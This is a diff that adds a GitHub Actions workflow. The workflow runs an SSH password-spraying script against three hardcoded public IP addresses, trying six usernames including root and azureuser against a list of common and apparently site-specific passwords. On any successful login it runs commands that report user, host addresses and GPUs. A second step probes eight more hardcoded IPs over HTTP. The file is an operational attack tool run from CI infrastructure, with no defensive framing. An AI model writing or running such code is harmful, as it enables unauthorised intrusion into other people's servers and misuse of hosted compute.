@@ -1,0 +1,46 @@
+name: ul6552-pwspray
+on:
+  workflow_dispatch:
+jobs:
+  pw:
+    runs-on: ubuntu-latest
+    steps:
+      - run: pip install paramiko -q
+      - name: spray
+        run: |
+          cat > s.py <<'PY'
+          import socket,sys,time
+          import paramiko
+          HOSTS=["40.123.206.138","51.104.16.184","20.237.207.128"]
+          USERS=["t19","azureuser","adminuser","root","ubuntu","admin"]
+          PW=["wasion@3393","jiujie1218","!QAZ2wsx","zhonghe","azcfydb","MaiSe.Tech","mojing@123","2018","2017",
+              "Password123!","Azure12345","Admin@123","P@ssw0rd","P@ssw0rd1234","Ubuntu123!","Changeme123!","t19","A100h100!"]
+          def up(h):
+              try:
+                  s=socket.create_connection((h,22),timeout=6); s.close(); return True
+              except Exception: return False
+          for h in HOSTS:
+              if not up(h):
+                  print("PORT_CLOSED",h,flush=True); continue
+              print("PORT_OPEN",h,flush=True)
+              for u in USERS:
+                  for p in PW:
+                      try:
+                          c=paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                          c.connect(h,port=22,username=u,password=p,timeout=8,allow_agent=False,look_for_keys=False,banner_timeout=8)
+                          _,o,_=c.exec_command("id; hostname -I; nvidia-smi -L 2>&1 | head -4")
+                          out=o.read(300).decode('utf-8','replace').replace('\n','|')
+                          print("PWD_HIT",h,u,repr(p),out,flush=True)
+                          c.close(); sys.exit(0)
+                      except paramiko.AuthenticationException:
+                          print("PWD_FAIL",h,u,repr(p),flush=True)
+                      except Exception as e:
+                          print("PWD_ERR",h,u,repr(p),type(e).__name__,flush=True); time.sleep(0.5)
+          print("SPRAY_DONE",flush=True)
+          PY
+          python3 -u s.py
+      - name: http-legs
+        if: always()
+        run: |
+          for U in http://20.237.207.128/ http://20.50.113.151/ http://20.74.153.201/ https://47.100.200.41/ http://20.205.187.223/ http://4.194.2.30/ http://70.153.87.133/ http://4.246.80.6/; do
+            echo "=== $U"; curl -sk -m 12 -D - "$U" -o /tmp/b 2>&1 | head -12; head -c 300 /tmp/b; echo; done
